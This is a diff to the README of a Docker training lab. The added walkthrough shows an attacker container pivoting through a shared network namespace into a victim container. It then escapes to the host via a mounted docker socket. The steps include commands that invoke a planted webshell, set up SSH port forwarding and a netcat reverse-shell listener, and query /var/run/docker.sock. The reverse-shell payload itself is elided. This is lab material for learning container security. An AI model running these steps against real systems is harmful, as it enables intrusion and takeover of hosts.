@@ -1,4 +1,5 @@
 # Attack Container Simple Lab
+This lab is made for testing attack container with 2 vulns, whichs are "Share network namespace" and "Insecure volumn mounts"
 
 ## Architecture
 
@@ -36,6 +37,9 @@ docker exec -it attacker ping 172.16.101.11
 ```
 
 ## Walkthrough
+From `attacker`, we attack to the `helper` which we can assume that it is a public facing server. The `helper` has the same network as `victim` (share network namespace) -> so we can abuse this and pivot in to container `victim`. Finally, the container `victim` has "Insecure volumn mounting" vulnerability so we can escape the container and control the host.
+
+### Share network namespace:
 First, access the container `attacker`:
 ```bash
 docker exec -it attacker /bin/bash
@@ -201,6 +205,33 @@ ETag: "682235aa-12"
 Accept-Ranges: bytes
 
 ```
+
+To keep this lab simple, we can assume that we have discovered the webshell in `/test.php`
+```
+root@attacker:/# proxychains -q curl http://172.16.101.11/test.php?cmd=echo+"hellowordl!"
+```
+
+Exploit this and get the reverse shell directly from `victim` to our `attacker` machine. First, we have to setup a remote forwarding port again and listen for reverse shell connection
+```bash
+root@attacker:/# ssh -R :80:172.16.100.10:80 -R :1331:172.16.100.10:1331 root@helper -N -f
+
+root@attacker:/# nc -lvnp 1331
+```
+
+Next, we send the revershell payload to `victim`
+```bash
+root@attacker:/# proxychains -q curl http://172.16.101.11/test.php?cmd=e<<rev_shell_payload>>
+```
+
+Finally, we are into the `victim` machine
+
+### Insecure volumn mounting
+...
+```bash
+./docker -H unix:///var/run/docker.sock ps
+```
+
+
 
 
 
